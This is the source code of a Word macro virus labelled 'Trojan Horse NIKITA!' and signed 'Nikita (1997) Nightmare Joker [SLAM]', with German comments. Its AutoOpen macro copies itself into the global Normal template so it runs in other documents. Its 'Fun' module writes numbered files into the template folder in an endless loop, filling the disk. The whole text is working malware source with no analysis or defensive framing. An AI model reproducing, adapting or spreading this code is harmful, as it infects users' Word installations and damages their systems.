   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Trojan Horse NIKITA!"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim AF$
   Dim Verzögerung
   On Error GoTo -1: On Error GoTo Finish
   AF$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))
   If AF$ = "NORMAL.DOT" Then
       GoTo BeginFun
   Else
       WordBasic.MacroCopy WordBasic.[FileName$]() + ":Fun", "Global:AutoOpen", 1
   End If
   BeginFun:
   Verzögerung = 800
   WordBasic.ViewPage
   WordBasic.ToolsOptionsView DraftFont:=0, WrapToWindow:=0, PicturePlaceHolders:=0, FieldCodes:=0, Bookmarks:=0, Tabs:=0, Spaces:=0, Paras:=0, Hyphens:=0, Hidden:=0, ShowAll:=0, Drawings:=1, Anchors:=0, TextBoundaries:=0
   WordBasic.ViewZoom AutoFit:=1
   WordBasic.ToggleFull
   WordBasic.DocMinimize
   WordBasic.DocMaximize
   Fun
   Finish:
   End Sub

   Private Sub Fun()
   Dim j
   Dim i
   Dim n
   '** ANIMATION DER ZEICHNUNGSELEMENTE **
   For j = 1 To 10
       WordBasic.WW7_EditGoTo Destination:="Augen"
       For i = 1 To 10
           WordBasic.DrawFlipHorizontal
           For n = 1 To Verzögerung: Next n
       Next i
       WordBasic.WW7_EditGoTo Destination:="Mund"
       For i = 1 To 10     ' hinter TO nur gerade Werte eingeben
           WordBasic.DrawFlipHorizontal
           For n = 1 To Verzögerung / 6: Next n
       Next i
       For i = 1 To 3
           WordBasic.DrawSendToBack
           For n = 1 To Verzögerung * 2.5: Next n
           WordBasic.DrawBringToFront
           For n = 1 To Verzögerung: Next n
       Next i
       WordBasic.SetTemplateDirty 0
       For n = 1 To Verzögerung * 6: Next n
   Next j
   End Sub

   Attribute VB_Name = "Fun"

   Public Sub MAIN()
   Dim A$
   Dim B$
   Dim i
   Dim a_
   Dim i_$
   On Error GoTo -1: On Error GoTo Finish

   A$ = WordBasic.[MacroFileName$]("AutoOpen")
   B$ = WordBasic.[FileNameInfo$](A$, 5)

   i = 0
   a_ = 5000

   Power:

   i_$ = Str(i)
   i_$ = WordBasic.[LTrim$](i_$)
   A$ = Str(a_)
   A$ = WordBasic.[LTrim$](A$)
   A$ = B$ + A$ + "." + i_$
   Open A$ For Output As 1
   Print #1, "Nikita (1997) Nightmare Joker [SLAM]"
   Close 1
   If i = 999 Then
       i = 0
   Else
       i = i + 1
   End If

   a_ = a_ + 1

   GoTo Power

   Finish:
   End Sub
